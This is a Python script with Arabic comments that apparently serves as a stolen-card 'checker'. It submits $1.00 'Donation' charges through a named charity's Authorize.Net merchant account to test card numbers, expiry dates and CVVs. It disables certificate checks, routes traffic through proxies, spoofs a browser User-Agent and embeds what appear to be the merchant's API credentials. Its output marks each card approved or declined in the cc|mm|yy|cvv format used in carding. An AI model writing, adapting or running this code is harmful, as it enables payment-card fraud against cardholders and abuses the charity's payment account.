"""
بوابة الدفع: Authorize.Net Charge Single
الموقع: www.ohelfamily.org
نوع البوابة: Authorize.Net Charge Single
تدفق الطلبات:
1. POST https://api2.authorize.net/xml/v1/request.api (createTransactionRequest) -> النتيجة المباشرة
"""
import aiohttp
import asyncio
import uuid
import ssl


async def req1_charge(
    session: aiohttp.ClientSession,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 1: إرسال طلب الشحن المباشر عبر Authorize.Net API."""
    payload = {
        "createTransactionRequest": {
            "merchantAuthentication": {
                "name": "7876S6uV",
                "transactionKey": "47W2v9u8S6b7L3mQ",
            },
            "transactionRequest": {
                "transactionType": "authCaptureTransaction",
                "amount": "1.00",
                "payment": {
                    "creditCard": {
                        "cardNumber": cc,
                        "expirationDate": f"{mes}/{ano}",
                        "cardCode": cvv,
                    }
                },
                "lineItems": {
                    "lineItem": {
                        "itemId": "1",
                        "name": "Donation",
                        "description": "Donation",
                        "quantity": "1",
                        "unitPrice": "1.00",
                    }
                },
            },
        }
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    try:
        async with session.post(
            "https://api2.authorize.net/xml/v1/request.api",
            json=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req1_charge failed: {e}") from e


async def process_Au_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Authorize.Net Charge Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            response_json = await req1_charge(session, cc, mes, ano, cvv, proxy_url)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Request Error: {e}"
    messages = response_json.get("messages", {})
    result_code = messages.get("resultCode", "").lower()
    transaction_response = response_json.get("transactionResponse", {})
    errors = transaction_response.get("errors", [])
    if result_code == "ok" and transaction_response.get("responseCode") == "1":
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif transaction_response.get("responseCode") == "2":
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    elif transaction_response.get("responseCode") == "3":
        error_text = errors[0].get("errorText", "Error") if errors else "Error"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {error_text}"
    else:
        msg_list = messages.get("message", [{}])
        msg_text = msg_list[0].get("text", "Unknown Error") if msg_list else "Unknown Error"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", msg_text
